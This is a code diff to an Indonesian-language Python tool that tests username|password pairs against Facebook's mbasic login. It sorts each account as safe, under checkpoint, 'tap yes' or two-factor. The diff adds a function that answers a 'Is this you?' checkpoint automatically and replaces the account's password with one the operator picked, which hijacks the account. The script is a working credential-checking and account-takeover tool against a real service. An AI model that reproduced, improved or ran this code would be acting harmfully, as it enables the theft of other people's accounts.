@@ -1,9 +1,11 @@
 import requests as req,re
 from bs4 import BeautifulSoup as par
+from concurrent.futures import ThreadPoolExecutor as Bool
 
 #data - data
 data,data2={},{}
 aman,cp,salah=0,0,0
+ubahP,pwBaru=[],[]
 
 class Main(object):
 	
@@ -45,47 +47,75 @@ class Eksekusi(Main):
 		data.update({"email":self.user,"pass":self.pw})
 		urlPost=session.post(self.url+link.get("action"),data=data)
 		response=par(urlPost.text, "html.parser")
-		if urlPost.status_code=="429":
+		if urlPost.status_code!=200:
 			print("[!] Nyalakan lalu matikan mode pesawat 2 Detik")
-		if "Akun Anda Dikunci" in urlPost.text:
-			print(f"\r[×] Akun sesi new\n[=] {self.user} | {self.pw}					\n\n",end="")
-		elif "c_user" in session.cookies.get_dict():
-			aman+=1
-			print(f"\r[√] Akun aman\n[=] {self.user} | {self.pw}					\n\n")
+		if "c_user" in session.cookies.get_dict():
+			if "Akun Anda Dikunci" in urlPost.text:
+				print(f"\r[×] Akun sesi new\n[=] {self.user} | {self.pw}					\n\n",end="")
+			else:
+				aman+=1
+				print(f"\r[=] {self.user} | {self.pw}\n[√] Akun Aman				\n\n",end="")
 		elif "checkpoint" in session.cookies.get_dict():
 			cp+=1
-			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
+			title=re.findall("\<title>(.*?)<\/title>",str(response))
 			link2=response.find("form",{"method":"post"})
+			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
 			for x in response("input"):
 				if x.get("name") in listInput:
 					data2.update({x.get("name"):x.get("value")})
 			response2=par(session.post(self.url+link2.get("action"),data=data2).text,"html.parser")
 			number=0
-			print(f"\r[×] Akun checkpoint\n[=] {self.user} | {self.pw}			\n",end="")
+			print(f"[=] {self.user} | {self.pw}			\n",end="")
 			cek=[cek for cek in response2.find_all("option")]
 			print(f"\r[!] Terdapat {len(cek)} opsi:\n",end="")
-			if(len(cek)<=1):
+			if(len(cek)==0):
+				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
+					if "y" in ubahP:
+						self.ubah_pw(session,response,link2)
+					else:
+						print(f"\r[√] Akun tap yes									\n")
+				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
+					print("\r[×] Akun a2f on							\n")
+				else:
+					print("Kesalahan!")
+			elif(len(cek)<=1):
 				for x in range(len(cek)):
 					number+=1
-					opsi=re.findall('\<option selected=\".+\" value=\".+\">(.+)<\/option>',str(cek))
+					opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
 					print(f"\r[{number}]. {''.join(opsi)}							\n\n",end="")
 			elif(len(cek)>=2):
 				for x in range(len(cek)):
 					number+=1
 					opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
 					print(f"\r[{number}]. {''.join(opsi)}							\n",end="")
+				print("")
 			else:
 				if "c_user" in session.cookies.get_dict():
 					cp-=1
 					aman+=1
-					print(f"\r[√] Akun aman\n[=] {self.user} | {self.pw}				\n\n",end="")
-				else:
-					if "Apakah Ini Anda?" in str(cek):
-						print("\r[√] Akun tap yes\n[=] {self.user} | {self.pw}							\n\n",end="")
+					print(f"\r[=] {self.user} | {self.pw}\n[√] Akun Aman				\n\n",end="")
 					
 		else:
 			salah+=1
-			print("\r[!] Kata sandi salah atau sudah diubah				\n\n")
+			print(f"\r[=] {self.user} | {self.pw}			\n",end="")
+			print("\r[!] Kata sandi salah atau sudah diubah				\n")
+	def ubah_pw(self,session,response,link2):
+		dat,dat2={},{}
+		but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+		for x in response("input"):
+			if x.get("name") in but:
+				dat.update({x.get("name"):x.get("value")})
+		ubahPw=session.post(self.url+link2.get("action"),data=dat).text
+		resUbah=par(ubahPw,"html.parser")
+		link3=resUbah.find("form",{"method":"post"})
+		but2=["submit[Next]","nh","fb_dtsg","jazoest"]
+		if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
+			for b in resUbah("input"):
+				if b.get("name") in but2:
+					dat2.update({b.get("name"):b.get("value")})
+			dat2.update({"password_new":"".join(pwBaru)})
+			session.post(self.url+link3.get("action"),data=dat2)
+			print(f"\r[√] Akun tap yes\n[=] Password diubah!\n[=] {self.user} | {''.join(pwBaru)}							\n",end="")
 
 def menu():
 	print("[1]. Cek opsi satu persatu\n[2]. Cek opsi melalui file\n[!]. Note: di tengah username dan password\n     harus ada tanda '|' atau '•'\n")
@@ -94,6 +124,16 @@ def menu():
 		print("\n[!] Pilihan tidak ada")
 		_pilih=input("[+] Chosee: ")
 	if(_pilih in ("01","1")):
+		ww=input("\n[?] Ubah pw ketika tap yes [y/t]: ")
+		if ww in ("y","ya"):
+			ubahP.append("y")
+			pwBar=input("[+] Masukan pw baru: ")
+			if len(pwBar) <= 5:
+				exit("Password harus lebih dari 6 character!")
+			else:
+				pwBaru.append(pwBar)
+		else:
+			print("> Skipped")
 		print("\n[!] Masukan username|password\n    contoh: latip|176")
 		__data=input("[+] Masukan username|password: ")
 		if "•" in __data:
@@ -106,6 +146,16 @@ def menu():
 		Main = Eksekusi("https://mbasic.facebook.com",user,pw)
 		Main.cek_opsi()
 	elif(_pilih in ("02","2")):
+		ww=input("\n[?] Ubah pw ketika tap yes [y/t]: ")
+		if ww in ("y","ya"):
+			ubahP.append("y")
+			pwBar=input("[+] Masukan pw baru: ")
+			if len(pwBar) <= 5:
+				exit("Password harus lebih dari 6 character!")
+			else:
+				pwBaru.append(pwBar)
+		else:
+			print("> Skipped")
 		print("\n[!]. Masukan nama file dan baca\n     terlebih dahulu note di atas")
 		__data=input("[+] Masukan nama file: ")
 		try:
